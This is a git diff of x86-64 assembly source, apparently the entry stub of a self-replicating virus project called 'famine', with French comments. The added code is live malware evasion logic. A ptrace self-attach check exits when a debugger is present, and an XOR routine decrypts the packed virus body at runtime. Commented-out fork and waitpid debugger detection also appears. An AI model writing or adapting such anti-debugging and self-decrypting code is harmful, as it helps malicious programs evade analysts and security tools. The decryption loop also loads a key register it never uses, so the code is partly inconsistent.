@@ -4,30 +4,6 @@ section .text
 	global	_start
 	extern	famine
 
-;fork
-
-; _ptrace:
-; 	; ptrace(PTRACE_TRACEME, 0, 0, 0)
-;     xor rdi, rdi          ; rdi = 0 (PTRACE_TRACEME = 0)
-;     xor rsi, rsi          ; rsi = 0
-;     xor rdx, rdx          ; rdx = 0
-;     xor r10, r10          ; r10 = 0
-;     mov rax, 101          ; syscall number for ptrace
-;     syscall
-;     ; Check if ptrace() returned an error
-;     test rax, rax         ; Check if rax < 0
-;     jge ret       		  ; Jump if no error (rax >= 0)
-;     ; kill(getpid())
-;     mov rax, 39           ; syscall number for getpid
-;     syscall               ; rax now holds the PID
-;     mov rdi, rax          ; Pass the PID to kill()
-;     mov rax, 62           ; syscall number for kill
-;     syscall
-;     ; exit(0)
-;     xor rdi, rdi          ; exit status = 0
-;     mov rax, 60           ; syscall number for exit
-;     syscall
-
 _start:
 	push	rax
 	push	rbx
@@ -46,9 +22,79 @@ _start:
     push    r8
 
 	jmp NEAR decrypt_done
+
+; _fork:
+;     mov rax, 57          ; syscall fork()
+;     syscall
+;     test rax, rax        ; Vérifier si on est dans le parent ou l'enfant
+;     jz _ptrace           ; Si rax == 0, c'est l'enfant
+;     jmp parent_process 
+
+; debugger_detected:
+;     ; Tuer le processus si un débogueur est détecté
+;     ; mov rax, 39           ; getpid syscall
+;     ; syscall
+;     ; mov rdi, rax
+;     ; mov rax, 62           ; kill syscall (SIGKILL)
+;     ; syscall
+;     mov	rax, 60
+; 	mov	rdi, 12
+; 	syscall
+
+; parent_process:
+;     mov rdi, -1           ; pid = -1 (attendre n'importe quel enfant)
+;     xor rsi, rsi          ; status = NULL
+;     xor rdx, rdx          ; options = 0
+;     mov rax, 61           ; waitpid syscall
+;     syscall
+;     ; Vérifier le code de retour de l'enfant
+;     shr rsi, 8            ; Extraire le code de retour (exit status >> 8)
+;     cmp rsi, -1           ; Si le code est -1, un débogueur a été détecté
+;     je debugger_detected
+;     jmp _manual_modif
+
+_manual_modif:
+    lea r15, [rel _ptrace]       ; Début de _ptrace
+    lea r14, [rel _ptrace_end]    ; Fin de _ptrace
+    lea r13, [rel decrypt]       ; Début de decrypt
+
+.loop:
+    cmp r15, r14                 ; while (current_ptrace < end_ptrace)
+    jae _ptrace                  ; Si on dépasse la fin, sortir
+
+    mov edx, [r15]               ; Charger 4 octets de _ptrace (clé)
+    mov ecx, [r13]               ; Charger 4 octets de decrypt (données chiffrées)
+    xor ecx, 0xcacacaca                 ; Déchiffrer avec XOR
+    mov [r13], ecx               ; Sauvegarder les données déchiffrées dans decrypt
+
+    add r15, 4                   ; Avancer de 4 octets dans _ptrace
+    add r13, 4                   ; Avancer de 4 octets dans decrypt
+    jmp .loop                    ; Répéter la boucle
+
+
+_ptrace:
+    xor rdi, rdi
+    xor rsi, rsi
+    xor rdx, rdx
+    xor r10, r10
+    mov rax, 101
+    syscall
+    ; Vérifier si ptrace a échoué
+    test rax, rax
+    jge decrypt
+
+    mov rdi, rax
+    mov	rax, 60
+	syscall
+
+_ptrace_end:
+    nop
+
+decrypt:
     lea r8, [rel famine]             ; Adresse de début (famine)
     lea r9, [rel _start]       ; Adresse de fin (_start)
     mov r10, 0x00000000      ; Exemple de clé 64 bits
+
 
 decrypt_loop:
     mov rax, r9
